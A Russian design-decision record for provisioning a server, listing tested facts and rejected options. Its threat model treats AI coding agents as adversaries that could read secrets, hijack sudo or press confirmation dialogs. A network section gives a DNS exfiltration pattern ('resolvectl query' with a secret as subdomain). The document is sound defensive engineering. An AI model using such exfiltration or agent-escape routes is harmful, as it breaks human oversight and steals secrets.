# 002. Подъём сервера — факты и отвергнутые варианты

Прототипы — в `.gotmp/` (вне git), 31.10.2026, rootless Podman на машине разработки; tofu — только офлайн
(`--network=none`, адрес API заглушкой). Строки с пометкой «аудит» или «ревью» — прототипы проверяющих.
Факты провайдера (нет `user_data` в провайдере, нет firewall, локальная сеть проекта без фильтров, образ
«Debian 13») — см. приватные заметки.

стенда идут тем же `ops/ctl-run.sh`); `age` в `podman run -it` читает фразу с терминала и пишет в `/dev/fd/3`,
канал доходит до основной оболочки, `ssh-add` не закрывает унаследованный дескриптор перед askpass (П2a-3);
`userdel` пользователя образа после `loginctl terminate-user` (`converge_site`).

Не проверено офлайн (гипотезы в design): под `sudo -iu` `loginctl` показывает сессию владельца; привязки
`/usr/bin:/bin` и прочие пути службы бэкапа в пустом корне; tar даёт код 2 при `SystemCallFilter=~getdents64`
(И4, CI); всё, что видно только на образе провайдера, — design §13: канонические имена и словарная форма модулей
cloud-init 25.x, `*_modules` в метаданных экземпляра, зависит ли сеть образа от cloud-init, `QGA_CONF` в
окружении юнита агента, `sshd_config` и `pam_env` образа, `kernel.yama.ptrace_scope`, другие агенты провайдера.

## 2. Почему сервис не стартует в локальном стенде

Rootless-контейнер на машине разработки получает 65536 uid (`/etc/subuid` пользователя). Внутри нужно: root,
пользователи и диапазон subuid `albums` не меньше 65533 (процесс сервиса — uid 65532), а uid процесса на «хосте»
цели — `начало + 65531`. Вместе больше 65536 — не помещается: `chown`/ACL на этот uid дают EINVAL, вложенный
Podman — «insufficient UIDs». Варианты: расширить subuid пользователя машины (правка системы — только с
согласия владельца), завести «стендовый» диапазон `1:65536` (роли и `assert` разошлись бы с боем) или полный
прогон в CI с rootful-целью. Выбран CI; локально — всё, кроме тега `albums-runtime`.

## 3. Отвергнуто

- **Меры внутри учётной записи владельца** (отказ при `CLAUDECODE`, свой агент, «yes» с терминала, страж как
  граница). Процессы Claude Code того же uid читают секреты и меняют код раскатки (§1); граница — отдельная
  учётная запись (решение владельца 31.10).
- **Вход в учётную запись раскатки через `sudo -iu`/`su` из сессии владельца.** Ввод в графической сессии
  перехватывается и подделывается, `sudo` подменяется через `~/.bashrc`, сессия и `XDG_RUNTIME_DIR` не те (§1).
  Выбран вход на текстовой консоли со своим паролем.
- **Хранилище секретов с подтверждением каждого доступа, `ssh-add -c` с askpass, обязательный FIDO2.** askpass
  на консоли без дисплея не работает, а с дисплеем владельца XTEST нажимает «OK»; хранилище — установка в
  систему; FIDO2 на консоли работает, но требует ключа — необязательное усиление позже. Выбран один файл age по
  фразе: инструмент уже в контроллере, фраза — с консоли, без кэша.
- **Вывод контейнеров с секретами в журнал по умолчанию.** Владелец в `adm` читает журнал раскатки (§1). Выбран
  `--log-driver=none` у каждого `sa-prov-*` с проверкой `podman inspect`; раскатка не в `adm`/`systemd-journal`.
- **Расшифровка в stdout под `-t` и разбор его `read`.** Подсказка и вывод в одном псевдотерминале, `\r\n` (§1).
  **Фраза через `read -s` на хосте и `AGE_PASSPHRASE_FD` или плагин age.** Фраза проходит через переменную
  оболочки и лишний механизм, которого в age нет без плагина. Выбран `age -d -o /dev/fd/3` с `--preserve-fds`:
  терминал — только для фразы.
- **Токен через `podman run -e`, `export TF_VAR_…` или `CLO_API_AUTH_TOKEN`.** Виден в `podman inspect` и на
  диске (§1), в истории оболочки и окружении потомков. **Токен через дескриптор** — возможен; выбран файл в
  tmpfs раскатки: проще обёртка, остаток тот же (та же учётная запись).
- **`tofu plan -out` и `apply <план>`.** План хранит значения переменных; интерактивный `apply` файла не требует.
- **Команда `plan`.** Интерактивный `apply` показывает план, «no» отменяет; лишняя команда — лишний вход токена.
- **Пароль vault файлом в tmpfs.** Лишний файл; канал через `--preserve-fds` не оставляет ничего. **Один канал на
  оба плея** — канал читается один раз.
- **Обе фразы ключей одним вызовом `ssh-add`.** Помощник не знает, какой ключ спрашивает; два вызова — по фразе.
- **Клон по локальному пути из рабочего дерева владельца.** Переносит `alternates` (§1) и требует открыть дом
  владельца. Выбран `git bundle` с fsck объектов (удалённый `file://` код не принимает). **Bundle по пути без `realpath`** — симлинк в
  каталоге входящих увёл бы чтение в чужой файл.
- **diffstat вместо diff до «yes».** Число строк не показывает, что изменилось. **`git diff` с цветом и `less -R`,
  без учёта `.gitattributes`.** Атрибуты прячут изменения, управляющие последовательности исполняет терминал (§1).
  **Подписанный тег сейчас** — нужен ключ подписи вне досягаемости процессов владельца (FIDO2); позже.
- **Просмотр только внутри `provision.sh` после `checkout`** (И2-1). Подменённый скрипт рисует пустой diff и
  спрашивает фразу. Выбран `review.sh` до `checkout`; просмотр в `provision.sh` — второй взгляд.
- **Чёрный список символов** (управляющие, нулевой ширины, bidi) (Р-8). Перечень не исчерпать; выбран белый
  список. **Типографские двойники ASCII в белом списке** (Р-12) — в `less` неотличимы от `-`, `'`, `"`, `x`.
- **Root для создания раскатки через `sudo` из сеанса владельца** (Р-6). Файлы запуска владельца пишут агенты,
  перехватчик на pty видит пароль; выбран recovery-режим GRUB. Отдельная административная учётная запись без
  агентов — равноценная альтернатива (Р-6), runbook описывает recovery.
- **Ключ `allow-rpcs` в аргументах `ExecStart` или в `/etc/qemu/qemu-ga.conf`** (И3-1). Файл образа и `QGA_CONF`
  подмешиваются к нашему; выбран свой файл через `-c` и сверка `--dump-conf`.
- **Сравнение запрещённых модулей cloud-init по написанию** (`set_passwords`/`set-passwords`) (Р-5, Р-10).
  Пропускает `cc_…`, `….py` и словарную форму; выбрано каноническое имя функцией cloud-init.
- **Шифрование `tfstate` средствами tofu** (`encryption`, Р-11). `key_provider`/`method "external"` запустил бы
  команду в контейнере `apply` с токеном и сетью; блок запрещён `tofu_static`.
- **Оба ключа в агенте на каждую команду.** Ключ забора во время `configure` не нужен (и наоборот); грузится
  только ключ команды, со сроком 3600 с (Р-7, Р-18).
- **`addresses { address_id = … }` в сервере.** При удалении сервера (в том числе `-replace`) адрес удаляется
  вместе с ним (§1).
- **Счётчики источников SSH в nftables (`meter`).** Множество без срока жизни и с `add` заполняется (сканеры —
  за недели, поддельные SYN — за секунды), и новые адреса упираются в `policy drop`. Вариант с `timeout` и
  `update` работает, но дублирует `PerSourcePenalties` sshd и требует своей проверки.
- **Повторный `bootstrap.yml` под администратором.** Роли `bootstrap` и `nftables` уже в `site.yml`, а удаление
  пользователя образа в повторе грозило удалить текущего пользователя; есть вход — только `site.yml`.
- **`Match User` и `ForceCommand` для пользователя бэкапа.** Дублируют `restrict,command=` в `authorized_keys`.
- **Замаскировать `qemu-guest-agent`.** Теряются снимки с заморозкой ФС. **Список `--block-rpcs`.** Новые
  команды агента в обновлениях открыты по умолчанию — белый список надёжнее.
- **cloud-init выключить сразу.** Неизвестно, генерирует ли он сеть при каждой загрузке в образе провайдера;
  до аренды убраны только модули пользователей, паролей и ключей. **`99-sa.cfg` только с исключениями** —
  списки заменяются целиком (§1), нужна полная копия без трёх модулей.
- **Два варианта образа цели; стендовый диапазон subuid `1:65536`.** Расхождение стенда с CI и боем (§2).
- **`ReadOnlyPaths=/` и `SystemCallFilter=~open_by_handle_at`.** Первое дублирует `ProtectSystem=strict`, второе
  уже вне `@system-service`; лишнее видимое закрывает `TemporaryFileSystem=/:ro` с привязкой нужного.
- **Обрыв `age` при ошибке tar.** Гонка: `age` мог уже дописать поток; метка только при tar ≤ 1 надёжнее.
- **Тест отказа «нечитаемый каталог».** С `CAP_DAC_READ_SEARCH` служба его прочитает. **Тест переименованием
  `/etc/albums-svc`.** Путь в `BindReadOnlyPaths` без «-» — служба падает с 226/NAMESPACE до tar. Выбран
  drop-in стенда с `SystemCallFilter=~getdents64`.
- **Возврат `age -d | ssh <admin> sudo albums-restore`.** stdin занят потоком, `sudo -S` съел бы начало архива —
  это толкает к `NOPASSWD`. **`NOPASSWD` ровно на `albums-restore`.** Кража ключа администратора = запись в
  `data/`. **Распаковка или разбор архива от root.** zstd и tar от root на недоверенном потоке: age не
  удостоверяет отправителя; разбор и распаковка — от uid сервиса.
- **Хранить самую новую проверенную копию дольше 30 дней.** Выбрано строго ≤ 30 дней, без исключений, даже для
  единственной копии: хранить фото дольше срока, включая альбомы, удалённые по сроку, — отступление от решения
  владельца (001-20). От потери всех копий защищает проверка свежести: новейшая проверенная копия старше 7 дней —
  предупреждение при каждом запуске `provision.sh` и в выводе таймера чистки; остановку забора видно за три
  недели до удаления последней копии.
- **Копия в открытом виде, проверка распаковкой на диск.** Фото клиентов на машине владельца; проверка — потоком.
- **sops вместо ansible-vault.** Отдельный инструмент, ключи и коллекция; vault встроен в ansible-core.
- **Шифрование `tfstate` или удалённый state.** Секретов в state нет по построению (импорт ключа, без пароля,
  эфемерный токен, проверка после `apply`), ключ шифрования стал бы ещё одним секретом. Один оператор —
  блокировка не нужна.
- **Генерация пары ключей провайдером.** Закрытый ключ — в state.
- **`sudo` без пароля.** Кража ключа администратора сразу давала бы root.
- **`flush ruleset` в `/etc/nftables.conf`.** Стирает чужие таблицы.
- **Caddy «не ниже» 2.11.7 с обновлением unattended.** Семантика заголовков менялась между версиями (стенд
  П1): новая версия — только после проверок `deploy/tests/` на её образе; сигнал — недельная проверка GHSA.
- **Ключ Caddy скачивать при раскатке.** Доверие при первом использовании; файл в репозитории проверяется
  тестом и ревью.
- **Свой файл Caddy и `ExecStart` в drop-in.** Артефакты И1 и README рассчитаны на `/etc/caddy/Caddyfile`;
  `force-confold` и `policy-rc.d` закрывают вопрос conffile и старта пакета.
- **`podman unshare chown` для `data/`.** Требует рабочего rootless Podman; `chown` от root на числовой uid —
  то же самое.
- **Бэкап через ACL на `data/`.** Маска ACL файла 0600 = `---`, именованная запись не действует.
- **Бэкап `sudo rrsync -ro` от root или rsync с файловой способностью.** Разбор аргументов клиента с правами на
  всё; поток без аргументов в песочнице systemd уже. Цена — полный поток вместо приращений; приращения — restic
  на этапе 7.
- **Снимок архива на диске сервера.** Удваивает занятое место на диске 20 ГБ.
- **`podman auto-update` в этапе 4.** Образ по дайджесту и `Pull=missing`; автообновление — этап 7.
- **Коллекции из Galaxy.** Без хэшей; пакет `ansible` из pip закреплён хэшем.


## 4. Поправка 03.11.2026: ВМ раскатки (design §16)

Устройство хоста и средство удалённого доступа — см. приватные заметки.

### Проверено (на рабочей ВМ, 03.11.2026)

- Ubuntu 24.04.5 LTS в VMware (`systemd-detect-virt` → `vmware`); open-vm-tools и open-vm-tools-desktop
  13.0.10, есть `vmhgfs-fuse` (libfuse3: `clone_fd`), он принимает `uid=`, `gid=`, `umask=`, `allow_other`;
  модуль `subdir` умеет преобразовывать симлинки — значит, симлинки через HGFS в принципе бывают.
- git 2.43.0 (`--attr-source` есть с 2.40), podman 4.9.3. У пакета `podman` в Recommends: `uidmap`, `slirp4netns`,
  `passt`, `catatonit`, `dbus-user-session`, `buildah` — apt ставит их по умолчанию.
- `/etc/login.defs`: `HOME_MODE 0750` (дом новой учётной записи — 0750, `guard_user` требует 0700),
  `SUB_UID_MIN`/`SUB_UID_COUNT` заданы (диапазон subuid выдаётся новой учётной записи — гипотеза для `adduser`
  3.137, проверить `grep sa-ops /etc/subuid`).
- Слушают на всех интерфейсах только UDP (в том числе avahi 5353); TCP — только на loopback (CUPS, резолвер).
  `ufw` установлен.
- GNU `dd iflag=nofollow,count_bytes count=<N+1>` копирует ровно N+1 байт и отказывает на симлинке (ELOOP) —
  прототип; `head -c` симлинк открывает.
- Поля `loginctl show-session`: `Type` бывает `unspecified`, `tty`, `x11`, `wayland`, `mir`, `web` —
  документация systemd.
- Точка монтирования с `ro`: запись отвергает VFS гостя (`EROFS`) до обращения к файловой системе — то есть
  независимо от того, соблюдает ли хост флаг Read-only (устройство Linux, `mount(8)`). Итог `touch … && echo
  ЗАПИСЬ-ПРОШЛА` в ops-ВМ (runbook §1) — вписать сюда после И5f.
- Со слов владельца, 03.11 в ops-ВМ уже сделаны: новый machine-id (отличается от рабочей ВМ), `ufw enable`
  с `deny incoming`.

### Гипотезы (проверить в ops-ВМ и в настройках гипервизора — И5f)

- Флаг «Read-only» общей папки соблюдает хост, а не только гость (не обязателен: главное — гостевой `ro`).
- У гипервизора одна NAT-сеть, обе ВМ в ней видят друг друга.
- ФС хоста не даёт создать из гостя FIFO и устройства; симлинки не важны — `nofollow` и `-f` закрывают и так.
- Без `umask=022` (или `uid=`) права файлов с хоста не дают `sa-ops` читать bundle; проверка —
  `sudo -u sa-ops test -r` в runbook §1.
- Переименование файла на HGFS атомарно для читателя в другой ВМ.
- Клон снимка содержит open-vm-tools (`command -v vmhgfs-fuse`), иначе — `apt install open-vm-tools`.
- GDM даёт сессию `Type=wayland` (или `x11`), `Remote=no` при входе с консоли ВМ.
- `sudo -iu sa-ops` и `su - sa-ops` из сессии администратора дают отказ проверки сессии (нет `XDG_SESSION_ID`
  или `Type=unspecified`, чужой `User`).
- Памяти ops-ВМ хватает на `podman build` контроллера и прогон `site.yml`.

### Отвергнуто

- **`sa-ops` в рабочей ВМ по runbook (recovery, текстовая консоль, `pam_access`).** Через удалённый доступ к
  хосту Esc в ВМ не доходит, а при `GRUB_TIMEOUT=0` меню GRUB не открыть: recovery недоступен; правка
  `GRUB_TIMEOUT` — под `sudo` владельца, то есть в досягаемости агентов; каждый вход — выход из графического
  сеанса (ВР-1).
- **Облегчённый `sa-ops` в рабочей ВМ.** Агент подменяет `sudo`/`su` в файлах запуска владельца и перехватывает
  ввод в его графической сессии (§3) — границы нет.
- **Раскатка из CI.** Токен провайдера и ключи — в GitHub; против решения по аккаунту провайдера (см. приватные
  заметки); push по каждому изменению кода раскатки.
- **Всё под учётной записью владельца в рабочей ВМ.** Секреты у агентов (§1).
- **Канал — сеть между ВМ** (`python -m http.server`, `git daemon`, `rsync` в рабочей ВМ). Нужен слушатель в
  рабочей ВМ и её адрес, ops-ВМ ходит к серверу агента (клиент HTTP или git разбирает чужие данные); правило
  «ops-ВМ ничего не слушает и никуда в локальную сеть не ходит» проще проверить.
- **Канал — две папки и перекладка на хосте.** В файловом менеджере хоста bundle не проверить; шаг ничего не
  добавляет к просмотру diff, зато добавляет ошибку «переложил старый».
- **Канал — GitHub.** Непросмотренный `dev` ушёл бы в публичный репозиторий (публикация — с «да» каждый раз)
  или понадобился бы ключ чтения приватного репозитория в ops-ВМ.
- **Канал — общий буфер, перетаскивание.** Выключены владельцем: двусторонний канал, через буфер из ops-ВМ
  могла бы уйти фраза или пароль. Уточнено ВР-17: односторонний буфер в VMware Workstation не
  работает; токен — одной загрузкой с буфером до секретов.
- **Только признаки рабочей ВМ в `guard.sh`** (процесс `claude`/`node`, `~/.claude`). Перечень запретов по
  умолчанию разрешает; чужие дома в Ubuntu 0750 — не видны. Оставлен как дополнение к метке (ВР-5).
- **Переменная окружения с путём метки.** Удобна тестам, но её можно задать по ошибке и обойти метку; тесты
  подставляют файлы монтированием.
- **Отказ, если метка — симлинк.** В `/etc` пишет только root, цель ссылки проходит те же проверки владельца,
  режима и содержимого; тест дорогой — `-v` разрешает симлинк источника (ВР-9).
- **Проверка флага хоста записью через второе монтирование без `ro`.** Гостевой `ro` закрывает запись сам; стоп
  только при `findmnt` без `ro`.

### Сеть ops-ВМ (04.11.2026, ВР-14, design §16.10)

**Проверено** (рабочая ВМ, Podman 4.9.3, образ tofu из `ops/images.env`, прототипы в `.gotmp/`):
- `tofu init -lockfile=readonly` при уже установленном провайдере в `TF_DATA_DIR` и `--network=none` — отказ: init
  запрашивает `registry.opentofu.org/.well-known/terraform.json`. С `-plugin-dir=<каталог провайдеров TF_DATA_DIR>`
  — проходит («Using previously-installed clo-ru/clo v2.8.0»); `validate` без сети — проходит.
- Подменённый `h1` в lock: с `-plugin-dir` на каталог установки — отказ («cannot install … to itself»), с отдельным
  зеркалом — отказ «doesn't match any of the checksums». Итог: провайдер сверяется с lock и без сети.
- `-plugin-dir` пишется в `TF_DATA_DIR/plugin_path`, но следующий init без флага снова идёт в реестр — окно
  подготовки обновляет провайдер обычным init.
- `podman build` контроллера с `HTTPS_PROXY` в никуда — тот же ID образа (слои из кэша, `--pull` по умолчанию
  `missing`).
- Контейнер tofu получает строки `/etc/hosts` хоста; `/etc/nsswitch.conf` образа — `hosts: files dns`; в образе есть
  `wget`, `nc`, `nslookup` (Alpine).
- По коду: сеть ops-ВМ нужна только tofu (хост `api_url`, 443) и ssh/Ansible (сервер, 22); `ctl-run.sh`,
  `secrets.sh`, `review.sh`, роли с `delegate_to: localhost` других адресов не трогают.
- В `before.rules` `ufw` (исходники ufw): для исходящих — только `-o lo` и `RELATED,ESTABLISHED`; DHCP клиента
  разрешён лишь на вход (`--sport 67 --dport 68`).
- Адрес API провайдера отсюда не получен: страж агентов не пустил разрешение имени API (граница агента, а не
  ошибка) — владелец получает его в ops-ВМ (design §16.10, таблица правил).

**Гипотезы (И5h):** провайдер ходит только на хост `api_url`; провайдер (Go) читает `/etc/hosts` по `nsswitch.conf`;
трафик rootless-контейнеров подпадает под `ufw` хоста; аренда DHCP в NAT VMware — 30 мин; адреса провайдера — в АС
его юрлица (открытые базы BGP: около 170 префиксов IPv4, больше 110 тыс. адресов).

**Отвергнуто:**
- **Правила по uid `sa-ops` (`-m owner` в `before.rules`), ВМ без режимов.** DNS уходит через системный резолвер:
  `systemd-resolved` — другой uid, к нему есть D-Bus и varlink, поэтому `resolvectl query <секрет>.чужой-домен`
  выносит данные мимо правила; закрыть DNS всё равно пришлось бы для всей ВМ. Плюс правка `before.rules` вместо
  команд `ufw`.
- **Диапазоны АС провайдера на 22 и 443.** Общий хостинг: приёмником становится ВМ любого клиента того же
  провайдера; список меняется.
- **Открытый DNS к шлюзу NAT.** Туннель через рекурсивный резолвер уносит токен одной строкой.
- **Прокси с белым списком имён в подготовке и раскатке.** В списке GitHub, реестры, PyPI — через них выгрузка на
  чужой аккаунт; ещё одна служба в ops-ВМ.
- **apt в раскатке по адресам архива Ubuntu.** Строки `/etc/hosts` и правила на меняющиеся адреса зеркал ради
  ежедневных обновлений; хватает окна подготовки раз в месяц.
- **Отдельное зеркало провайдера (`tofu providers mirror`).** Каталог установки в `TF_DATA_DIR` уже годится как
  `-plugin-dir`; второй каталог — лишний шаг.
- **Широковещательный udp 67.** Его слышит рабочая ВМ в той же сети NAT.
- **Переключение без перезагрузки.** `ufw` пропускает `ESTABLISHED`: соединение или поток UDP, открытый в окне,
  пережил бы переключение; `ss -K` не трогает UDP.
